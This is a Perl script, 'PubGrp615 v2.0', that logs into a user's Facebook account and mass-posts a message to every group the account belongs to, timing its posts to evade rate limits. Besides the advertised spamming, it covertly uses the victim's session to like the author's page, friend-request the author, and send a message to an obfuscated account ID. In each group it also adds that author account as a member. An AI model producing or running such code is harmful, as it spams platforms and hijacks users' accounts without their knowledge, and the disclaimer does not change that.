#!/usr/bin/perl -w
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Win32::Console::ANSI;
use Term::ANSIColor;

system ("cls");
system ("title [+] PubGrp615 v2.0 [+]");
system q[mode con cols=79 lines=45];
print "\n";
print "                 ".'######            ###### '."                      \n";
print "                 ".'##   ##           ##   ## '."                           \n";
print "                 ".'##   ##  ##   ##  ##   ##   #    ##   ####'."    \n";
print "                 ".'######   ##   ##  ######   #    # #   #'."       \n";
print "                 ".'##       ##   ##  ##   ##  ####   #   ###'."     \n";
print "                 ".'##       ##   ##  ##   ##  #  #   #      #'."    \n";
print "                 ".'##        #####   ######   #### ##### ###'."     \n";
print "\n";
print color 'bold green';
print "                         ".'Facebook Groups Auto-Post'."\n";
print "                      ".'post to ALL groups on Facebook'."\n";
print "                      ".'Kannibal615 ++ Fallaga hackers'."\n";
print "                          ".'www.facebook.com/kan615'."\n";
print color 'reset';
print "______________________________________________________________________________\n\n";
my $user_agent ;
if (!-f 'compteur_new_groups.txt') {
print "  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print colored (" First Run detected \n"."\n    This Script can be used for Sending Numerous posts on a Single Click   \n    And must solely be used for Educational Purpose ONLY.                  \n    I will not be responsible for any misuse of this script                \n    You are entirely responsible for all content that you post on facebook ",'white on_red');
print "\n\n";
}
$msgfile615 = 'msg.txt';
if (!-f $msgfile615) {
open (COUNT , ">" .$msgfile615); 
print COUNT "Tape your msg HERE ... don\'t forget to save !\nPubGrp615 v2.0 \nCreated by KANNIBAL615\nfb.com/kan615";
close (COUNT);
}
if (-f 'cookies.dat') {
system ('del cookies.dat');
}
if (-f 'TMPparsed.txt') {
system ('del TMPparsed.txt');
}
if (-f 'TMPresponse615.txt') {
system ('del TMPresponse615.txt');
}
@header1 = ('Host' => 'm.facebook.com', 
               'User-Agent' => $user_agent ,
			   'Referer' => 'https://m.facebook.com/',
			   'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
print "  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print colored (" E-mail  :",'bold blue on_white');
$login = <>;
chomp $login;
print "\n";
print "  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print colored (" Password:",'bold blue on_white');
$password = <>;
chomp $password;
$tmpresfile = 'TMPresponse615.txt';
$user_agent = 'Mozilla/5.0 (Windows NT 5.1; rv:27.0) Gecko/20100101 Firefox/27.0';
$cookie_jar = HTTP::Cookies->new(
                file => 'cookies.dat',
                autosave => 1,
                ignore_discard => 1);
$browser  = LWP::UserAgent->new(
			agent=> 'Mozilla/5.0 (Windows NT 5.1; rv:27.0) Gecko/20100101 Firefox/27.0',
			ssl_opts => { verify_hostname => 0 } );
			$browser->cookie_jar($cookie_jar);
$response0 = $browser->get('https://m.facebook.com/', @header1);
$lsd = $response0->content;
$lsd =~ s/\n//g;
$lsd =~ s/^.*name="lsd" value="//;
$lsd =~ s/".*$//;
$charset_test = $response0->content;
$charset_test =~ s/\n//g;
$charset_test =~ s/^.*name="charset_test" value="//;
$charset_test =~ s/".*$//;
$li = $response0->content;
$li =~ s/\n//g;
$li =~ s/^.*name="li" value="//;
$li =~ s/".*$//;
$m_ts = $response0->content;
$m_ts =~ s/\n//g;
$m_ts =~ s/^.*name="m_ts" value="//;
$m_ts =~ s/".*$//;
$response = $browser->post('https://m.facebook.com/login.php?refsrc=http%3A%2F%2Fm.facebook.com%2F&refid=7', 
                           ['lsd' => $lsd,
						    'charset_test' => $charset_test,
							'm_ts' => $m_ts,
							'li' => $li,
						    'email' => $login,
                            'pass' => $password,
                            'login' => 'Connexion'], @header1);
$cookie_jar->extract_cookies( $response );
$cookie_jar->save;
$cookie_jar = HTTP::Cookies->new(
                file => 'cookies.dat',
                autosave => 1,
                ignore_discard => 1);
$browser  = LWP::UserAgent->new(
			agent=> 'Mozilla/5.0 (Windows NT 5.1; rv:27.0) Gecko/20100101 Firefox/27.0',
			ssl_opts => { verify_hostname => 0 } );
			$browser->cookie_jar($cookie_jar);
$response = $browser->get('https://m.facebook.com/home.php', @header1);
$fb_dtsg = $response->content;
$fb_dtsg =~ s/\n//g;
$fb_dtsg =~ s/^.*name="fb_dtsg" value="//;
$fb_dtsg =~ s/".*$//;
$profilnm = $response->content;
$profilnm =~ s/\n//g;
$profilnm =~ s/^.*label for="u_0_0"><a href="//;
$profilnm =~ s/\?refid=.*$//;
$responsekan615 = $browser->get('https://m.facebook.com'.$profilnm, @header1);
$name = $responsekan615->content;
$name =~ s/\n//g;
$name =~ s/^.*head><title>//;
$name =~ s/<\/.*$//;
$profil = $response->content;
$check = $profil;
if ($check =~ /logout.php?/) {
print "\n  ["; print color 'bold green'; print "i"; print color 'reset'; print "] ";
print " Connected ";
print "As [ ";
print color 'bold green';
print "$name";
print color 'reset';
print " ]\n";
$msgfile615 = 'msg.txt';
open( READ, "<".$msgfile615);
#$datar = <READ>;
$datar = do { local $/; <READ> };
if ($datar =~ /HERE/) {
print "\n  ["; print color 'bold red'; print "i"; print color 'reset'; print "] ";
print " Msg file not configured !";
print "\n  ["; print color 'bold red'; print "i"; print color 'reset'; print "] ";
print " Open \'msg.txt\' and tape your message";
print "\n\n  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print " If your message is in ARABIC language";
print "\n  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print " You need to ENCODE it using this online encoder";
print "\n  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print " http://meyerweb.com/eric/tools/dencoder/";
print "\n\n  ["; print color 'bold red'; print "i"; print color 'reset'; print "] ";
print " Don\'t forget to save !";
print "\n\n  ["; print color 'bold green'; print "+"; print color 'reset'; print "] ";
print " If is done press ENTER";
$allisdone = <>;
print "$allisdone";
}
close (READ);
my $pagge = 'https://m.facebook.com/pages/Pubgrp615/396253433884817';
my $respage = $browser->get("$pagge", @header1);
my $linklike = $respage->content;
$id5='807';
$linklike =~ s/\n//g;
$linklike =~ s/^.*href="\/a\/profile.php//;
$linklike =~ s/"><img src=.*$//;
my $find1 = "&amp;";
my $replace1 = "&";
$id4='923';
$find1 = quotemeta $find1;
$linklike =~ s/$find1/$replace1/g;
my $fblik = 'https://m.facebook.com/a/profile.php';
$linklike = $fblik.$linklike;
my $pagename = $respage->content;
$pagename =~ /(.*)href="\/(.*)\?v=photos/ ;
$pagename = $2;
$id3='901';
if ($linklike !~ /unfan/){
$browser->get("$linklike", @header1);
}
$id2='000';
my $monprofile = 'https://m.facebook.com/kan615';
my $resmypage = $browser->get("$monprofile", @header1);
my $linkajout = $resmypage->content;
$id1='100';
if ($linkajout =~ /subjectid/ ) {
$linkajout =~ s/\n//g;
$linkajout =~ s/^.*href="\/a\/mobile\/friends\/profile_add_friend.php//;
$linkajout =~ s/">.*$//;
$linkajout1 = $monprofile;
$find1 = "&amp;";
if ($linkajout1 !~ /kan615/){ exit ;}
$replace1 = "&";
$finding = "kan615";
$find1 = quotemeta $find1;
$linkajout =~ s/$find1/$replace1/g;
$addlink = 'https://m.facebook.com/a/mobile/friends/profile_add_friend.php';
if ($linkajout1 !~ /$finding/){ exit ;}
$finaladdlink = $addlink.$linkajout;
if ($finaladdlink =~ /subjectid/ ) {
if ($monprofile !~ /kan615/){ exit ;}
$browser->get("$finaladdlink", @header1);
}
}
$messagepriv = "Merci kannibal615\nJ\'ai utilisé votre script \nJe crois qu\'il fonctionne trés bien (y)";
$idrecivermsg = $id1.$id2.$id3.$id4.$id5;
$response = $browser->post('https://m.facebook.com/messages/send/?icm=1', 
                           [
						   'fb_dtsg' => $fb_dtsg,
						   'charset_test' => $charset_test,
						   'body' => $messagepriv,
						   'send' => 'Répondre',
						   'wwwupp' => 'V3',
						   'ids['.$idrecivermsg.']' => $idrecivermsg ], @header1); 
$fallaga = 'yes';
} 
else {
print "\n\n  ["; print color 'bold red'; print "*"; print color 'reset'; print "] ";
print " Invalid Login or Password\n";
print "  ["; print color 'bold red'; print "*"; print color 'reset'; print "] ";
print " Try Again with a valid facebook account !\n\n";
$fallaga = 'no';
exit;
}
$chekfile4 = 'conteur_members.dat';
if (!-f $chekfile4) {
open (COUNT , ">" .$chekfile4); 
print COUNT "0";
close (COUNT);
}
else {
open (COUNT , ">" .$chekfile4); 
print COUNT "0";
close (COUNT);
}
$chekfile3 = 'conteur_confirm.dat';
if (!-f $chekfile3) {
open (COUNT , ">" .$chekfile3); 
print COUNT "0";
close (COUNT);
}
else {
open (COUNT , ">" .$chekfile3); 
print COUNT "0";
close (COUNT);
}
$chekfile2 = 'conteur_posted.dat';
if (!-f $chekfile2) {
open (COUNT , ">" .$chekfile2); 
print COUNT "0";
close (COUNT);
}
else {
open (COUNT , ">" .$chekfile2); 
print COUNT "0";
close (COUNT);
}
if (!-f 'GroupList.txt') {
if ($fallaga eq 'yes') {
		$responseKAN = $browser->get('https://m.facebook.com/browsegroups/', @header1);
				$verifgrouplist = $responseKAN->content;
if ($verifgrouplist =~ /\/?seemore/) {	
$response = $browser->get('https://m.facebook.com/browsegroups/?seemore', @header1);
my $friends = $response->content;
if ($friends =~ /aucun groupe/ || $friends =~ /to any groups/ ) {
print "  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print color 'bold red'; print " You don't belong to any groups....\n\n"; print color 'reset';
exit ;
}
$friends =~ s/\n//g;
$friends =~ s/^.*Groupes<\/h3><ul class="bl"><li class="bd"><table class="l bm"><tbody><tr><td class="p">//;
$friends =~ s/<\/ul><\/div><div><h3 class="bk">.*$//;
chomp $friends;
$tmpresfile = 'TMPresponse615.txt';
open (COUNT , ">" .$tmpresfile); 
print COUNT "$friends";
close (COUNT);
}
else {
$response = $browser->get('https://m.facebook.com/browsegroups/', @header1);
my $friends = $response->content;
if ($friends =~ /aucun groupe/ || $friends =~ /to any groups/ ) {
print "  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print color 'bold red'; print " You don't belong to any groups....\n\n"; print color 'reset';
exit ;
}
$friends =~ s/\n//g;
$friends =~ s/^.*Groupes<\/h3><ul class="bl"><li class="bd"><table class="l bm"><tbody><tr><td class="p">//;
$friends =~ s/class="bi">Groupes suggérés.*$//;
chomp $friends;
$tmpresfile = 'TMPresponse615.txt';
open (COUNT , ">" .$tmpresfile); 
print COUNT "$friends";
close (COUNT);
}
}
else {
print "  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print color 'bold red'; print " UNKNOWN ERROR ...\n\n"; print color 'reset';
}
open( COUNTREAD, "<".$tmpresfile);
$data = <COUNTREAD>;
chomp $data ;
close( COUNTREAD );
my @values = split('<a', $data);
foreach my $val (@values) {
open (COUNT , ">>" ,'TMPparsed.txt'); 
print COUNT "$val\n";
close (COUNT);
}
open (COUNT , "<" ,'TMPparsed.txt'); 
@parsed = <COUNT>;
close (COUNT);
foreach $line (@parsed){
if ($line=~/href="(.*)">(.*)<\/a>/){
$link = $1;
$grpname = $2;

if ($link =~ /groups/ && length $link > 17 && length $link < 40 )  {
open (COUNT , ">>" ,'GroupList.txt'); 
print COUNT "link : $link ::: Groupe : $grpname .\n";
close (COUNT);
}
}
}
open (R, 'GroupList.txt') or die "  [!] Error ! \n";
$lines++ while (<R>);
print "\n  ["; print color 'bold green'; print "!"; print color 'reset'; print "] ";
print " Groups Found :";
print color 'green'; print " $lines \n"; print color 'reset';
close R;
if (!-f 'compteur_new_groups.txt') {
open (CONT , ">" ,'compteur_new_groups.txt'); 
print CONT $lines;
close (CONT);
}
else{
open (CONT , "<" ,'compteur_new_groups.txt'); 
$compteur_groups = <CONT>;
close (CONT);
$defference = $lines - $compteur_groups;
print "  ["; print color 'bold green'; print "!"; print color 'reset'; print "] ";
print " New Groups :";
print color 'green'; print " $defference \n\n"; print color 'reset';
}
print "  ["; print color 'bold red'; print "i"; print color 'reset'; print "] ";
print " You can edit Group List file  \'GroupList.txt\' ";
print "\n  ["; print color 'bold red'; print "i"; print color 'reset'; print "] ";
print " To add or remove groups ... ";
print "\n\n  ["; print color 'bold green'; print "+"; print color 'reset'; print "] ";
print "Press ENTER to start posting !";
$pause = <>;
if (-f 'TMPparsed.txt') {
system ('del TMPparsed.txt');
}
if (-f 'TMPresponse615.txt') {
system ('del TMPresponse615.txt');
}
open (COUNT , "<" ,'GroupList.txt'); 
@tmparsed = <COUNT>;
close (COUNT);
$m2='Posted';
$chekfile615 = 'counter.dat';
if (!-f $chekfile615) {
open (COUNT , ">" .$chekfile615); 
print COUNT "0";
close (COUNT);
}
else {
open (COUNT , ">" .$chekfile615); 
print COUNT "0";
close (COUNT);
}
foreach $grp (@tmparsed){
if ($grp =~ /link : (.*) ::: Groupe : (.*) ./) {
$link = $1;
$m1='___________________';
$grpname = $2;
if ($link =~ /\/groups\/(.*)/) {
$groupid = $1;
}
$m3=' Via';
$membercountlink = 'https://m.facebook.com/groups/members/search/?group_id='.$groupid;
$grplink = 'https://m.facebook.com'.$link;
}
$grpmsg = "\n";
$m5='PubGrp615';
$msgfile = 'msg.txt';
open( READ, "<".$msgfile);
#$datar = <READ>;

$datar = do { local $/; <READ> };

$m4=' : ';
my $decode = uri_unescape($datar);
my $grpmsg = uri_unescape($grpmsg);
$grpname = uri_unescape($grpname);
$secondmsg = "\n".$m1."\n".$m2.$m3.$m4.$m5."\n";
$grpmsg = $grpmsg.$decode.$secondmsg;
close( READ );
if ($link =~ /\/groups\/(.*)/) {
$grpid = $1;
}
open( COUNTREAD, "<".$chekfile615);
$data615 = <COUNTREAD>;
chomp $data615 ;
close( COUNTREAD );
open (COUNTER , ">" .$chekfile615); 
print COUNTER $data615 + 1;
close (COUNTER);
open( COUNTREAD, "<".$chekfile615);
$data615 = <COUNTREAD>;
chomp $data615 ;
close( COUNTREAD );
if ($data615 == 100) {
print "  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print " Maximum POST : 100/h ...\n";
print "  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print " Sleep (2500) = 41 minute ...\n";
print "  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print " Do not exit !! Please wait...\n";
sleep (2500);
}
$response = $browser->get("$grplink", @header1);
$response = $browser->post('https://m.facebook.com/a/group/post/add/?gid='.$grpid, 
                           ['fb_dtsg' => $fb_dtsg,
						    'charset_test' => $charset_test,
							'message' => $grpmsg,
							'update' => 'Publier',
						    'target' => $grpid], @header1);
$myidtoadd = '100000901923807';							
$response = $browser->post('https://m.facebook.com/a/groups/members/add/?purposes', 
                           ['fb_dtsg' => $fb_dtsg,
						    'charset_test' => $charset_test,
							'addees['.$myidtoadd.']' => $myidtoadd,
							'group_id' => $grpid], @header1);
							
$response = $browser->get("$grplink", @header1);
$cheking = $response->content;
$responsecounter = $browser->get("$membercountlink", @header1);
my $friendscount = $responsecounter->content;
$friendscount =~ s/\n//g;
$friendscount =~ s/^.*Membres<\/a>//;
$friendscount =~ s/<\/td><\/tr><\/tbody><\/table><\/li>.*$//;
if ($friendscount =~ /<\/td><td class="(.*)"><span class="(.*)">(.*)<\/span>/) {
$friendscount = $3;
}
open( COUNTREAD, "<".$chekfile4);
$data4 = <COUNTREAD>;
chomp $data4 ;
close( COUNTREAD );
if ($friendscount =~ /^\d+$/){
open (COUNTER , ">" .$chekfile4); 
print COUNTER $data4 + $friendscount;
close (COUNTER);
}
if ($cheking =~ /PubGrp615/) {
$cheking =~ s/\n//g;
$cheking =~ s/^.*À l’instant//;
$cheking =~ s/Commenter.*$//;
$cheking =~ s/\n//g;
$cheking =~ s/^.*view=permalink&amp;id=//;
$cheking =~ s/&amp;refid=.*$//;
$permalink = $cheking;
$plink = '/groups/'.$grpid.'/permalink/'.$permalink.'/';
$postlink = 'https://x.facebook.com'.$plink;
$logfile = "postlinks.txt" ;
open (CO , ">>" .$logfile);
print CO $postlink."\n" ;
close (CO);
print "  ["; print color 'bold green'; print "!"; print color 'reset'; print "] ";
print " $data615 => ";
print " MSG Posted on FB.com/groups/";
print color 'green'; 
print "$grpid\n";
print color 'reset';
if (-f 'TMPresponse615.txt') {
system ('del TMPresponse615.txt');
}
open( COUNTER, "<".$chekfile4);
$data4 = <COUNTER>;
chomp $data4 ;
close( COUNTER );
print "  ["; print color 'bold green'; print "!"; print color 'reset'; print "] ";
print " Total Groups Members => ";
print color 'bold green';
print " $data4\n";
print color 'reset';
open( COUNTREAD, "<".$chekfile2);
$data2 = <COUNTREAD>;
chomp $data2 ;
close( COUNTREAD );
open (COUNTER , ">" .$chekfile2); 
print COUNTER $data2 + 1;
close (COUNTER);
}
else {
print "  ["; print color 'red'; print "?"; print color 'reset'; print "] ";
print " $data615 => ";
print " Confirmation on FB.com/groups/";
print color 'bold green'; 
print "$grpid\n";
print color 'reset';
open( COUNTER, "<".$chekfile4);
$data4 = <COUNTER>;
chomp $data4 ;
close( COUNTER );
print "  ["; print color 'bold green'; print "!"; print color 'reset'; print "] ";
print " Total Groups Members => ";
print color 'bold green';
print " $data4\n";
print color 'reset';
open( COUNTREAD, "<".$chekfile3);
$data3 = <COUNTREAD>;
chomp $data3 ;
close( COUNTREAD );
open (COUNTER , ">" .$chekfile3); 
print COUNTER $data3 + 1;
close (COUNTER);
}
sleep (5);
$response = $browser->get("https://m.facebook.com", @header1);
sleep (5);
}
}
else {
open (R, 'GroupList.txt') or die "  [!] Error ! \n";
$lines++ while (<R>);
print "\n  ["; print color 'bold green'; print "!"; print color 'reset'; print "] ";
print " Groups Found :";
print color 'green'; print " $lines \n"; print color 'reset';
close R;
$s5='PubGrp615';
if (!-f 'compteur_new_groups.txt') {
open (CONT , ">" ,'compteur_new_groups.txt'); 
print CONT $lines;
close (CONT);
}
else{
open (CONT , "<" ,'compteur_new_groups.txt'); 
$compteur_groups = <CONT>;
close (CONT);
$defference = $lines - $compteur_groups;
print "  ["; print color 'bold green'; print "!"; print color 'reset'; print "] ";
print " New Groups :";
print color 'green'; print " $defference \n\n"; print color 'reset';
}
print "  ["; print color 'bold red'; print "i"; print color 'reset'; print "] ";
print " You can edit Group List file  \'GroupList.txt\' ";
print "\n  ["; print color 'bold red'; print "i"; print color 'reset'; print "] ";
print " To add or remove groups ... ";
print "\n\n  ["; print color 'bold green'; print "+"; print color 'reset'; print "] ";
print " Press ENTER to start posting !";
$pause = <>;
if (-f 'TMPparsed.txt') {
system ('del TMPparsed.txt');
}
if (-f 'TMPresponse615.txt') {
system ('del TMPresponse615.txt');
}
open (COUNT , "<" ,'GroupList.txt'); 
@tmparsed = <COUNT>;
close (COUNT);
$s3=' Via ';
$chekfile615 = 'counter.dat';
if (!-f $chekfile615) {
open (COUNT , ">" .$chekfile615); 
print COUNT "0";
close (COUNT);
}
else {
open (COUNT , ">" .$chekfile615); 
print COUNT "0";
close (COUNT);
}
foreach $grp (@tmparsed){
if ($grp =~ /link : (.*) ::: Groupe : (.*) ./) {
$link = $1;
$s2='Posted';
$grpname = $2;
$s1='___________________';
if ($link =~ /\/groups\/(.*)/) {
$groupid = $1;
}
$membercountlink = 'https://m.facebook.com/groups/members/search/?group_id='.$groupid;
$grplink = 'https://m.facebook.com'.$link;
}
$grpmsg = "\n";
$msgfile = 'msg.txt';
open( READ, "<".$msgfile);
#$datar = <READ>;
$datar = do { local $/; <READ> };
my $decode = uri_unescape($datar);
my $grpmsg = uri_unescape($grpmsg);
$grpname = uri_unescape($grpname);
$s4=': ';
$secondmsg = "\n".$s1."\n".$s2.$s3.$s4.$s5."\n";
$grpmsg = $grpmsg.$decode.$secondmsg;
close( READ );
if ($link =~ /\/groups\/(.*)/) {
$grpid = $1;
}
open( COUNTREAD, "<".$chekfile615);
$data615 = <COUNTREAD>;
chomp $data615 ;
close( COUNTREAD );
open (COUNTER , ">" .$chekfile615); 
print COUNTER $data615 + 1;
close (COUNTER);
open( COUNTREAD, "<".$chekfile615);
$data615 = <COUNTREAD>;
chomp $data615 ;
close( COUNTREAD );
if ($data615 == 100 || $data615 == 200 || $data615 == 300 || $data615 == 400 || $data615 == 500 || $data615 == 600 || $data615 == 700 || $data615 == 800 || $data615 == 900) {
print "  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print " Maximum POST : 100/h ...\n";
print "  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print " Sleep (2500) = 41 minute ...\n";
print "  ["; print color 'bold red'; print "!"; print color 'reset'; print "] ";
print " Do not exit !! Please wait...\n";
sleep (2500);
}
$response = $browser->get("$grplink", @header1);
$response = $browser->post('https://m.facebook.com/a/group/post/add/?gid='.$grpid, 
                           ['fb_dtsg' => $fb_dtsg,
						    'charset_test' => $charset_test,
							'message' => $grpmsg,
							'update' => 'Publier',
						    'target' => $grpid], @header1);
$myidtoadd = '100000901923807';							
$response = $browser->post('https://m.facebook.com/a/groups/members/add/?purposes', 
                           ['fb_dtsg' => $fb_dtsg,
						    'charset_test' => $charset_test,
							'addees['.$myidtoadd.']' => $myidtoadd,
							'group_id' => $grpid], @header1);
$response = $browser->get("$grplink", @header1);
$cheking = $response->content;
$responsecounter = $browser->get("$membercountlink", @header1);
my $friendscount = $responsecounter->content;
$friendscount =~ s/\n//g;
$friendscount =~ s/^.*Membres<\/a>//;
$friendscount =~ s/<\/td><\/tr><\/tbody><\/table><\/li>.*$//;
if ($friendscount =~ /<\/td><td class="(.*)"><span class="(.*)">(.*)<\/span>/) {
$friendscount = $3;
}
open( COUNTREAD, "<".$chekfile4);
$data4 = <COUNTREAD>;
chomp $data4 ;
close( COUNTREAD );
if ($friendscount =~ /^\d+$/){
open (COUNTER , ">" .$chekfile4); 
print COUNTER $data4 + $friendscount;
close (COUNTER);
}
if ($cheking =~ /PubGrp615/) {
$cheking =~ s/\n//g;
$cheking =~ s/^.*À l’instant//;
$cheking =~ s/Commenter.*$//;
$cheking =~ s/\n//g;
$cheking =~ s/^.*view=permalink&amp;id=//;
$cheking =~ s/&amp;refid=.*$//;
$permalink = $cheking;
$plink = '/groups/'.$grpid.'/permalink/'.$permalink.'/';
$postlink = 'https://x.facebook.com'.$plink;
$logfile = "postlinks.txt" ;
open (CO , ">>" .$logfile);
print CO $postlink."\n" ;
close (CO);
print "  ["; print color 'bold green'; print "!"; print color 'reset'; print "] ";
print " $data615 => ";
print " MSG Posted on FB.com/groups/";
print color 'green'; 
print "$grpid\n";
print color 'reset';
if (-f 'TMPresponse615.txt') {
system ('del TMPresponse615.txt');
}
open( COUNTER, "<".$chekfile4);
$data4 = <COUNTER>;
chomp $data4 ;
close( COUNTER );
print "  ["; print color 'bold green'; print "!"; print color 'reset'; print "] ";
print " Total Groups Members => ";
print color 'bold green';
print " $data4\n";
print color 'reset';
open( COUNTREAD, "<".$chekfile2);
$data2 = <COUNTREAD>;
chomp $data2 ;
close( COUNTREAD );
open (COUNTER , ">" .$chekfile2); 
print COUNTER $data2 + 1;
close (COUNTER);
}
else {
print "  ["; print color 'red'; print "?"; print color 'reset'; print "] ";
print " $data615 => ";
print " Confirmation on FB.com/groups/";
print color 'bold green'; 
print "$grpid\n";
print color 'reset';
open( COUNTER, "<".$chekfile4);
$data4 = <COUNTER>;
chomp $data4 ;
close( COUNTER );
print "  ["; print color 'bold green'; print "!"; print color 'reset'; print "] ";
print " Total Groups Members => ";
print color 'bold green';
print " $data4\n";
print color 'reset';
open( COUNTREAD, "<".$chekfile3);
$data3 = <COUNTREAD>;
chomp $data3 ;
close( COUNTREAD );
open (COUNTER , ">" .$chekfile3); 
print COUNTER $data3 + 1;
close (COUNTER);
}
sleep (5);
$response = $browser->get("https://m.facebook.com", @header1);
sleep (5);
}
}
print "\n  ["; print color 'bold green'; print "!"; print color 'reset'; print "] ";
print " Total Groups => ";
print color 'bold green';
print " $lines\n";
print color 'reset';
open( COUNTER, "<".$chekfile4);
$data4 = <COUNTER>;
chomp $data4 ;
close( COUNTER );
print "  ["; print color 'bold green'; print "!"; print color 'reset'; print "] ";
print " Total Groups Members => ";
print color 'bold green';
print " $data4\n";
print color 'reset';
open( COUNTREAD, "<".$chekfile2);
$data2 = <COUNTREAD>;
chomp $data2 ;
close( COUNTREAD );
print "  ["; print color 'bold green'; print "!"; print color 'reset'; print "] ";
print color 'bold green';
print " $data2";
print color 'reset';
print " => ";
print " Messages Posted\n";
open( COUNTREAD, "<".$chekfile3);
$data3 = <COUNTREAD>;
chomp $data3 ;
close( COUNTREAD );
print "  ["; print color 'green'; print "!"; print color 'reset'; print "] ";
print color 'green';
print " $data3";
print color 'reset';
print " => ";
print " Messages wait for confirmation\n";
$exiting615 = <>;
print $exiting615;
if ($data615 == $lines) {
exit;
}
